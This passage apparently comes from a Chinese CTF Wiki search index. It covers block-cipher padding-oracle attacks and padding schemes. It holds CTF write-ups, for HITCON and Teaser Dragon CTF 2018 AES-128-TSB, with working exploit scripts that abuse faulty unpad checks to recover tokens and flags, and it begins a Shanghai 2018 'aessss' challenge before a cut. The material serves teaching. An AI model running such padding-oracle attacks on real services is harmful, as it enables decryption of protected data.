in range(256):\n            if MD5.new(x + chr(c)).digest()[-1] == chr(lastbyte):\n                newcandidates.append(x + chr(c))\n    candidates = newcandidates\n    print candidates\n    return candidates\n\n\ndef main():\n    bypassproof()\n\n    # result of encrypted Welcome!!\n    iv_encrypt, cipher_welcome = recvmsg()\n    log.info(\"cipher welcome is : \" + cipher_welcome)\n\n    # execute get-token\n    get_token_iv = flipplain(pad(\"Welcome!!\"), pad(\"get-token\"), iv_encrypt)\n    sendmsg(get_token_iv, cipher_welcome)\n    _, cipher_token = recvmsg()\n    token_len = len(cipher_token)\n    log.info(\"cipher token is : \" + cipher_token)\n\n    # get command not found cipher\n    sendmsg(iv_encrypt, cipher_welcome)\n    _, cipher_notfound = recvmsg()\n\n    # get encrypted(token[:i+1]),57 times\n    md5_token_idx_list = get_md5_token_indexi(iv_encrypt, cipher_welcome,\n                                              cipher_token)\n    # get md5map for each unpadsize, 209-17 times\n    # when upadsize&gt;208, it will unpad ciphertoken\n    # then we can reuse\n    md5map = dict()\n    for unpadsize in range(17, 209):\n        log.info(\"get unpad size {} cipher\".format(unpadsize))\n        get_md5_iv = flipplain(\"token: \".ljust(16, '\\x00'), \"get-md5\".ljust(\n            16, '\\x00'), iv_encrypt)\n        ## padding 16*11 bytes\n        padding = 16 * 11 * \"a\"\n        ## calculate the proper last byte number, only change the last byte\n        ## set last_byte_iv = iv_encrypted[:15] | proper byte\n        last_byte_iv = flipplain(\n            pad(\"Welcome!!\"),\n            pad(\"Welcome!!\")[:15] + chr(unpadsize), iv_encrypt)\n        cipher = cipher_token + padding + last_byte_iv + cipher_welcome\n        sendmsg(get_md5_iv, cipher)\n        _, unpadcipher = recvmsg()\n        md5map[unpadcipher] = unpadsize\n\n    # reuse encrypted(token[:i+1])\n    for i in range(209, 256):\n        target = md5_token_idx_list[56 - (i - 209)]\n        md5map[target] = i\n\n    candidates = [\"\"]\n    # get the byte token[i], only 56 byte\n    for i in range(token_len - 7):\n        log.info(\"get token[{}]\".format(i))\n        get_md5_iv = flipplain(\"token: \".ljust(16, '\\x00'), \"get-md5\".ljust(\n            16, '\\x00'), iv_encrypt)\n        ## padding 16*11 bytes\n        padding = 16 * 11 * \"a\"\n        cipher = cipher_token + padding + iv_encrypt + md5_token_idx_list[i]\n        sendmsg(get_md5_iv, cipher)\n        _, unpadcipher = recvmsg()\n        # already in or md5[token[:i]][-1]='\\x00'\n        if unpadcipher in md5map or unpadcipher == cipher_notfound:\n            candidates = doin(unpadcipher, md5map, candidates, 1)\n        else:\n            log.info(\"unpad size 1-16\")\n            # flip most significant bit of last byte to move it in a good range\n            cipher = cipher[:-17] + strxor(cipher[-17], '\\x80') + cipher[-16:]\n            sendmsg(get_md5_iv, cipher)\n            _, unpadcipher = recvmsg()\n            if unpadcipher in md5map or unpadcipher == cipher_notfound:\n                candidates = doin(unpadcipher, md5map, candidates, 0)\n            else:\n                log.info('oh my god,,,, it must be in...')\n                exit()\n    print len(candidates)\n    # padding 0x01\n    candidates = filter(lambda x: x[-1] == chr(0x01), candidates)\n    # only 56 bytes\n    candidates = [x[:-1] for x in candidates]\n    print len(candidates)\n    assert (len(candidates[0]) == 56)\n\n    # check-token\n    check_token_iv = flipplain(\n        pad(\"Welcome!!\"), pad(\"check-token\"), iv_encrypt)\n    sendmsg(check_token_iv, cipher_welcome)\n    p.recvuntil(\"Give me the token!\\n\")\n    p.sendline(base64.b64encode(candidates[0]))\n    print p.recv()\n\n    p.interactive()\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>\u6548\u679c\u5982\u4e0b</p> <pre><code>...\n79\n1\nhitcon{uNp@d_M3th0D_i5_am4Z1n9!}\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#teaser-dragon-ctf-2018-aes-128-tsb","title":"Teaser Dragon CTF 2018 AES-128-TSB","text":"<p>\u8fd9\u4e2a\u9898\u76ee\u8fd8\u662f\u86ee\u6709\u610f\u601d\u7684\uff0c\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b</p> <pre><code>Haven't you ever thought that GCM mode is overcomplicated and there must be a simpler way to achieve Authenticated Encryption? Here it is!\n\nServer: aes-128-tsb.hackable.software 1337\n\nserver.py\n</code></pre> <p>\u9644\u4ef6\u4ee5\u53ca\u6700\u540e\u7684 exp \u81ea\u884c\u5230 ctf-challenge \u4ed3\u5e93\u4e0b\u5bfb\u627e\u3002</p> <p>\u9898\u76ee\u7684\u57fa\u672c\u6d41\u7a0b\u4e3a</p> <ul> <li>\u4e0d\u65ad\u63a5\u6536 a \u548c b \u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u5176\u4e2d a \u4e3a\u660e\u6587\uff0cb \u4e3a\u5bc6\u6587\uff0c\u6ce8\u610f</li> <li>b \u5728\u89e3\u5bc6\u540e\u9700\u8981\u6ee1\u8db3\u5c3e\u90e8\u6070\u597d\u7b49\u4e8e iv\u3002</li> <li>\u5982\u679c a \u548c b \u76f8\u7b49\uff0c\u90a3\u4e48\u6839\u636e</li> <li>a \u4e3a <code>gimme_flag</code> \uff0c\u8f93\u51fa\u52a0\u5bc6\u540e\u7684 flag\u3002</li> <li>\u5426\u5219\uff0c\u8f93\u51fa\u4e00\u4e32\u968f\u673a\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u3002</li> <li>\u5426\u5219\u8f93\u51fa\u4e00\u4e32\u660e\u6587\u7684\u5b57\u7b26\u4e32\u3002</li> </ul> <p>\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u9898\u76ee\u4e2d\u7684 unpad \u5b58\u5728\u95ee\u9898\uff0c\u53ef\u4ee5\u622a\u65ad\u6307\u5b9a\u957f\u5ea6\u3002</p> <pre><code>def unpad(msg):\n    if not msg:\n        return ''\n    return msg[:-ord(msg[-1])]\n</code></pre> <p>\u4e00\u5f00\u59cb\uff0c\u5f88\u76f4\u63a5\u7684\u601d\u8def\u662f a \u548c b \u7684\u957f\u5ea6\u90fd\u8f93\u5165 0 \uff0c\u90a3\u4e48\u53ef\u4ee5\u76f4\u63a5\u7ed5\u8fc7 <code>a==b</code> \u68c0\u67e5\uff0c\u83b7\u53d6\u4e00\u4e32\u968f\u673a\u5bc6\u6587\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u3002\u7136\u800c\u4f3c\u4e4e\u5e76\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u52a0\u5bc6\u7684\u6d41\u7a0b</p> <pre><code>def tsb_encrypt(aes, msg):\n    msg = pad(msg)\n    iv = get_random_bytes(16)\n    prev_pt = iv\n    prev_ct = iv\n    ct = ''\n    for block in split_by(msg, 16) + [iv]:\n        ct_block = xor(block, prev_pt)\n        ct_block = aes.encrypt(ct_block)\n        ct_block = xor(ct_block, prev_ct)\n        ct += ct_block\n        prev_pt = block\n        prev_ct = ct_block\n    return iv + ct\n</code></pre> <p>\u4e0d\u59a8\u5047\u8bbe P_0=iv,C_0=iv\uff0c\u5219</p> <p>C_i=C_{i-1}\\oplus E(P_{i-1} \\oplus P_i)</p> <p>\u90a3\u4e48\uff0c\u5047\u8bbe\u6d88\u606f\u957f\u5ea6\u4e3a 16\uff0c\u4e0e\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684<code>gimme_flag</code> padding \u540e\u957f\u5ea6\u7c7b\u4f3c\uff0c\u5219</p> <p>C_1=IV\\oplus E( IV \\oplus P_1)</p> <p>C_2=C_1 \\oplus E(P_1 \\oplus IV)</p> <p>\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u53d1\u73b0 C_2=IV\u3002</p> <p>\uff08\u76d7\u56fe\uff0c\u4e0b\u9762\u7684\u56fe\u7247\u66f4\u52a0\u6e05\u6670</p> <p></p> <p>\u53cd\u8fc7\u6765\u60f3\uff0c\u5982\u679c\u6211\u4eec\u5411\u670d\u52a1\u5668\u53d1\u9001 <code>iv+c+iv</code>\uff0c\u90a3\u4e48\u603b\u80fd\u7ed5\u8fc7 <code>tsb_decrypt</code> \u7684 mac \u68c0\u67e5</p> <pre><code>def tsb_decrypt(aes, msg):\n    iv, msg = msg[:16], msg[16:]\n    prev_pt = iv\n    prev_ct = iv\n    pt = ''\n    for block in split_by(msg, 16):\n        pt_block = xor(block, prev_ct)\n        pt_block = aes.decrypt(pt_block)\n        pt_block = xor(pt_block, prev_pt)\n        pt += pt_block\n        prev_pt = pt_block\n        prev_ct = block\n    pt, mac = pt[:-16], pt[-16:]\n    if mac != iv:\n        raise CryptoError()\n    return unpad(pt)\n</code></pre> <p>\u90a3\u4e48\u6b64\u65f6\uff0c\u670d\u52a1\u5668\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u5219\u662f</p> <p>unpad(IV \\oplus D(C_1 \\oplus IV))</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_10","title":"\u83b7\u53d6\u660e\u6587\u6700\u540e\u4e00\u4e2a\u5b57\u8282","text":"<p>\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u63a7\u5236 D \u89e3\u5bc6\u7684\u6d88\u606f\u4e3a\u5e38\u6570\u503c\uff0c\u6bd4\u5982\u5168\u96f6\uff0c\u5373<code>C1=IV</code>\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece 0 \u5230 255 \u679a\u4e3e IV \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u5f97\u5230 IV \\oplus D(C_1 \\oplus IV) \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e5f\u662f 0~255\u3002\u800c\u53ea\u6709\u662f 1~15 \u7684\u65f6\u5019\uff0c<code>unpad</code> \u64cd\u4f5c\u8fc7\u540e\uff0c\u6d88\u606f\u957f\u5ea6\u4e0d\u4e3a 0\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u679a\u4e3e\u65f6\u7edf\u8ba1\u7a76\u7adf\u54ea\u4e9b\u6570\u5b57\u5bfc\u81f4\u4e86\u957f\u5ea6\u4e0d\u4e3a\u96f6\uff0c\u5e76\u6807\u8bb0\u4e3a 1\uff0c\u5176\u4f59\u6807\u8bb0\u4e3a 0\u3002</p> <pre><code>def getlast_byte(iv, block):\n    iv_pre = iv[:15]\n    iv_last = ord(iv[-1])\n    tmp = []\n    print('get last byte')\n    for i in range(256):\n        send_data('')\n        iv = iv_pre + chr(i)\n        tmpblock = block[:15] + chr(i ^ ord(block[-1]) ^ iv_last)\n        payload = iv + tmpblock + iv\n        send_data(payload)\n        length, data = recv_data()\n        if 'Looks' in data:\n            tmp.append(1)\n        else:\n            tmp.append(0)\n    last_bytes = []\n    for i in range(256):\n        if tmp == xor_byte_map[i][0]:\n            last_bytes.append(xor_byte_map[i][1])\n    print('possible last byte is ' + str(last_bytes))\n    return last_bytes\n</code></pre> <p>\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6700\u521d\u7684\u65f6\u5019\u6253\u8868\u83b7\u53d6\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u6240\u6709\u7684\u53ef\u80fd\u60c5\u51b5\uff0c\u8bb0\u5f55\u5728 xor_byte_map \u4e2d\u3002</p> <pre><code>\"\"\"\nevery item is a pair [a,b]\na is the xor list\nb is the idx which is zero when xored\n\"\"\"\nxor_byte_map = []\nfor i in range(256):\n    a = []\n    b = 0\n    for j in range(256):\n        tmp = i ^ j\n        if tmp &gt; 0 and tmp &lt;= 15:\n            a.append(1)\n        else:\n            a.append(0)\n        if tmp == 0:\n            b = j\n    xor_byte_map.append([a, b])\n</code></pre> <p>\u901a\u8fc7\u4e0e\u8fd9\u4e2a\u8868\u8fdb\u884c\u5bf9\u6bd4\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u53ef\u80fd\u7684\u60c5\u51b5\u3002</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_11","title":"\u89e3\u5bc6\u4efb\u610f\u52a0\u5bc6\u5757","text":"<p>\u5728\u83b7\u53d6\u4e86\u660e\u6587\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528  unpad \u7684\u6f0f\u6d1e\uff0c\u4ece\u957f\u5ea6 1 \u679a\u4e3e\u5230\u957f\u5ea6 15 \u6765\u83b7\u5f97\u5bf9\u5e94\u7684\u660e\u6587\u5185\u5bb9\u3002</p> <pre><code>def dec_block(iv, block):\n    last_bytes = getlast_byte(iv, block)\n\n    iv_pre = iv[:15]\n    iv_last = ord(iv[-1])\n    print('try to get plain')\n    plain0 = ''\n    for last_byte in last_bytes:\n        plain0 = ''\n        for i in range(15):\n            print 'idx:', i\n            tag = False\n            for j in range(256):\n                send_data(plain0 + chr(j))\n                pad_size = 15 - i\n                iv = iv_pre + chr(pad_size ^ last_byte)\n                tmpblock = block[:15] + chr(\n                    pad_size ^ last_byte ^ ord(block[-1]) ^ iv_last\n                )\n                payload = iv + tmpblock + iv\n                send_data(payload)\n                length, data = recv_data()\n                if 'Looks' not in data:\n                    # success\n                    plain0 += chr(j)\n                    tag = True\n                    break\n            if not tag:\n                break\n        # means the last byte is ok\n        if plain0 != '':\n            break\n    plain0 += chr(iv_last ^ last_byte)\n    return plain0\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_12","title":"\u89e3\u5bc6\u51fa\u6307\u5b9a\u660e\u6587","text":"<p>\u8fd9\u4e00\u70b9\u6bd4\u8f83\u7b80\u5355\uff0c\u6211\u4eec\u5e0c\u671b\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u83b7\u53d6 <code>gimme_flag</code> \u7684\u5bc6\u6587</p> <pre><code>    print('get the cipher of flag')\n    gemmi_iv1 = xor(pad('gimme_flag'), plain0)\n    gemmi_c1 = xor(gemmi_iv1, cipher0)\n    payload = gemmi_iv1 + gemmi_c1 + gemmi_iv1\n    send_data('gimme_flag')\n    send_data(payload)\n    flag_len, flag_cipher = recv_data()\n</code></pre> <p>\u5176\u4e2d plain0 \u548c cipher0 \u662f\u6211\u4eec\u83b7\u53d6\u7684 AES \u52a0\u5bc6\u7684\u660e\u5bc6\u6587\u5bf9\uff0c\u4e0d\u5305\u62ec\u4e4b\u524d\u548c\u4e4b\u540e\u7684\u4e24\u4e2a\u5f02\u6216\u3002</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#flag","title":"\u89e3\u5bc6 flag","text":"<p>\u8fd9\u4e00\u70b9\uff0c\u5176\u5b9e\u5c31\u662f\u5229\u7528\u89e3\u5bc6\u4efb\u610f\u52a0\u5bc6\u5757\u7684\u529f\u80fd\u5b9e\u73b0\u7684\uff0c\u5982\u4e0b</p> <pre><code>    print('the flag cipher is ' + flag_cipher.encode('hex'))\n    flag_cipher = split_by(flag_cipher, 16)\n\n    print('decrypt the blocks one by one')\n    plain = ''\n    for i in range(len(flag_cipher) - 1):\n        print('block: ' + str(i))\n        if i == 0:\n            plain += dec_block(flag_cipher[i], flag_cipher[i + 1])\n        else:\n            iv = plain[-16:]\n            cipher = xor(xor(iv, flag_cipher[i + 1]), flag_cipher[i])\n            plain += dec_block(iv, cipher)\n            pass\n        print('now plain: ' + plain)\n    print plain\n</code></pre> <p>\u53ef\u4ee5\u601d\u8003\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u7b2c\u4e8c\u5757\u4e4b\u540e\u7684\u5bc6\u6587\u64cd\u4f5c\u4f1a\u6709\u6240\u4e0d\u540c\u3002</p> <p>\u5b8c\u6574\u7684\u4ee3\u7801\u53c2\u8003 ctf-challenge \u4ed3\u5e93\u3002</p>"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/#_13","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u5206\u7ec4\u52a0\u5bc6\u6a21\u5f0f</li> <li>https://en.wikipedia.org/wiki/Padding_oracle_attack</li> <li>http://netifera.com/research/poet/PaddingOraclesEverywhereEkoparty2010.pdf</li> <li>https://ctftime.org/writeup/7975</li> <li>https://ctftime.org/writeup/7974</li> </ul>"},{"location":"crypto/blockcipher/mode/padding/","title":"\u586b\u5145\u65b9\u5f0f","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u5728\u5206\u7ec4\u52a0\u5bc6\u4e2d\uff0c\u660e\u6587\u7684\u957f\u5ea6\u5f80\u5f80\u5e76\u4e0d\u6ee1\u8db3\u8981\u6c42\uff0c\u9700\u8981\u8fdb\u884c padding\uff0c\u800c\u5982\u4f55 padding \u76ee\u524d\u4e5f\u5df2\u7ecf\u6709\u4e86\u4e0d\u5c11\u7684\u89c4\u5b9a\u3002</p> <p>\u5e38\u89c1\u7684 \u586b\u5145\u89c4\u5219 \u5982\u4e0b\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5373\u4f7f\u6d88\u606f\u7684\u957f\u5ea6\u662f\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u4ecd\u7136\u9700\u8981\u586b\u5145\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u5728\u89e3\u5bc6\u4e4b\u540e\u53d1\u73b0 Padding \u4e0d\u6b63\u786e\uff0c\u5219\u5f80\u5f80\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u6211\u4eec\u4e5f\u56e0\u6b64\u53ef\u4ee5\u77e5\u9053 Paddig \u662f\u5426\u6b63\u786e\u3002</p>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-bytes-all-of-the-same-value-as-the-number-of-padding-bytes-pkcs5-padding","title":"Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)","text":"<p>\u4e3e\u4f8b\u5b50\u5982\u4e0b</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6F 72 05 05 05 05 05\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-0x80-followed-by-zero-bytes-oneandzeroes-padding","title":"Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)","text":"<p>\u4e3e\u4f8b\u5b50\u5982\u4e0b</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6F 72 80 00 00 00 00\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40\n</code></pre> <p>\u8fd9\u91cc\u5176\u5b9e\u5c31\u662f\u548c md5 \u548c sha1 \u7684 padding \u5dee\u4e0d\u591a\u3002</p>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-zeroes-except-make-the-last-byte-equal-to-the-number-of-padding-bytes","title":"Pad with zeroes except make the last byte equal to the number of padding bytes","text":"<p>\u4e3e\u4f8b\u5b50\u5982\u4e0b</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 00 00 00 00 05\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-zero-null-characters","title":"Pad with zero (null) characters","text":"<p>\u4e3e\u4f8b\u5b50\u5982\u4e0b</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 00 00 00 00 00\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#pad-with-spaces","title":"Pad with spaces","text":"<p>\u4e3e\u4f8b\u5b50\u5982\u4e0b</p> <pre><code>DES INPUT BLOCK  = f  o  r  _  _  _  _  _\n(IN HEX)           66 6f 72 20 20 20 20 20\nKEY              = 01 23 45 67 89 AB CD EF\nDES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25\n</code></pre>"},{"location":"crypto/blockcipher/mode/padding/#2018-aessss","title":"2018 \u4e0a\u6d77\u5e02\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u5927\u8d5b aessss","text":"<p>\u6709\u65f6\u5019\u53ef\u4ee5\u9488\u5bf9\u4e00\u4e9b\u4f7f\u7528\u4e0d\u5f53\u7684 Padding \u8fdb\u884c\u653b\u51fb\u3002\u8fd9\u91cc\u4ee5 2018 \u4e0a\u6d77\u5e02\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u5927\u8d5b\u7684\u4e00\u9053\u9898\u76ee\u4e3a\u4f8b\uff1a</p> <p>\u9898\u76ee\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>import random\nimport sys\nimport string\nfrom hashlib import sha256\nimport SocketServer\nfrom Crypto.Cipher import AES\nfrom secret import FLAG, IV, KEY\n\n\nclass Task(SocketServer.BaseRequestHandler):\n    def proof_of_work(self):\n        proof = ''.join(\n            [random.choice(string.ascii_letters+string.digits) for _ in xrange(20)])\n        # print proof\n        digest = sha256(proof).hexdigest()\n        self.request.send(\"sha256(XXXX+%s) == %s\\n\" % (proof[4:], digest))\n        self.request.send('Give me XXXX:')\n        x = self.request.recv(10)\n        x = x.strip()\n        if len(x) != 4 or sha256(x+proof[4:]).hexdigest() != digest:\n            return False\n        return True\n\n    def pad(self, s):\n        s += (256 - len(s)) * chr(256 - len(s))\n        ret = ['\\x00' for _ in range(256)]\n        for index, pos in enumerate(self.s_box):\n            ret[pos] = s[index]\n        return ''.join(ret)\n\n    def unpad(self, s):\n        ret = ['\\x00' for _ in range(256)]\n        for index, pos in enumerate(self.invs_box):\n            ret[pos] = s[index]\n        return ''.join(ret[0:-ord(ret[-1])])\n\n    s_box = [\n        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,\n        0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,\n        0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,\n        0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,\n        0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,\n        0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,\n        0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,\n        0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,\n        0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,\n        0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,\n        0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,\n        0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,\n        0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,\n        0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,\n        0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,\n        0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16\n    ]\n\n    invs_box = [\n        0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,\n        0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,\n        0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,\n        0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,\n        0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,\n        0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,\n        0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,\n        0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,\n        0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,\n        0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,\n        0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,\n        0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,\n        0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,\n        0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,\n        0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,\n        0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D\n    ]\n\n    def encrypt(self, msg):\n        cipher = AES.new(KEY, AES.MODE_CBC, IV)\n        return cipher.encrypt(msg).encode('hex')\n\n    def handle(self):\n        if not self.proof_of_work():\n            return\n        self.request.settimeout(15)\n        req = self.request\n        flag_len = len(FLAG)\n        assert(flag_len == 33)\n        self.flag = self.pad(FLAG)\n        assert(len(self.flag) == 256)\n\n        while True:\n            req.sendall(\n                'Welcome to AES(WXH) encrypt system.\\n1. get encrypted flag.\\n2. pad flag.\\n3.Do some encrypt.\\nYour choice:')\n            cmd = req.recv(2).strip()\n            try:\n                cmd = int(cmd)\n            except ValueError:\n                cmd = 0\n            if cmd == 1:\n                enc = self.encrypt(self.flag)\n                req.sendall('Here is the encrypted flag: 0x%s\\n' % enc)\n            elif cmd == 2:\n                req.sendall('Pad me something:')\n                self.flag = self.unpad(self.flag)[\n                    :flag_len] + req.recv(1024).strip()\n                assert(len(self.flag) &lt;= 256)\n                self.flag = self.pad(self.flag)\n                req.sendall('Done.\\n')\n            elif cmd == 3:\n                req.sendall('What do you want to encrypt:')\n                msg = self.pad(req.recv(1024).strip())\n                assert(len(msg) &lt;= 256)\n                enc = self.encrypt(msg)\n                req.sendall('Here is the encrypted message: 0x%s\\n' % enc)\n            else:\n                req.sendall('Do not lose heart\uff5e \uff01% Once WXH AK IOI 2019 can Solved! WXH is the first in the tianxia!')\n                req.close()\n                return\n\n\nclass ThreadedServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):\n    pass\n\n\nif __name__ == \"__main__\":\n    HOST, PORT = '0.0.0.0', 23333\n    print 'Run in port:23333'\n    server = ThreadedServer((HOST, PORT), Task)\n    server.allow_reuse_address = True\n    